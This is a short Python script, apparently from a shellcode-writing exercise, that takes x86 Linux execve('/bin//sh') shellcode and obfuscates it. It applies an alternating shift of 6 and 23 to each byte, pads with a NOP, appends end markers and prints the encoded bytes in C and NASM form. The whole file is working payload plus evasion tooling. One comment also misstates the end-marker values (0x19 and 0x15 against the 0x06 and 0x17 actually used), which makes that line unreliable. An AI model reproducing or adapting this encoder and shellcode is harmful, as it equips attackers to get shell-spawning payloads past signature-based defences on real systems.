#!/usr/bin/env python
import sys

# Python Multi-Shift Caesar Cipher
# execve shellcode using the stack
shellcode = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")
shellcode_bytes = bytearray(shellcode)
shellcode_len = len(shellcode_bytes)

if (shellcode_len % 2) != 0:
    shellcode += '\x90'
    shellcode_bytes = bytearray(shellcode)
    shellcode_len = len(shellcode_bytes)

c_encoded = ""
nasm_encoded = ""

print('[*] Encoding shellcode...')

switch = False
for x in shellcode_bytes:
    if not switch:
        modifier = 6
    else:
        modifier = 23
    c_encoded += '\\x{:02x}'.format((x + modifier) % 256)
    nasm_encoded += '0x{:02x}, '.format((x + modifier) % 256)
    switch = not switch

print('[*] Encoding complete!\n')
# mark the end of our shellcode with 0x19 (25 decimal) and 0x15 (21 decimal)
c_encoded += '\\x06\\x17'
nasm_encoded += '0x06, 0x17'

if '\\x00' in c_encoded:
    print('[!] Warning! Encoded shellcode includes a null value.\n')

print('[*] C formatted encoded shellcode:')
print(c_encoded + '\n')
print('[*] NASM formatted  encoded shellcode:')
print(nasm_encoded)

print('Len: {}'.format(shellcode_len + 2))
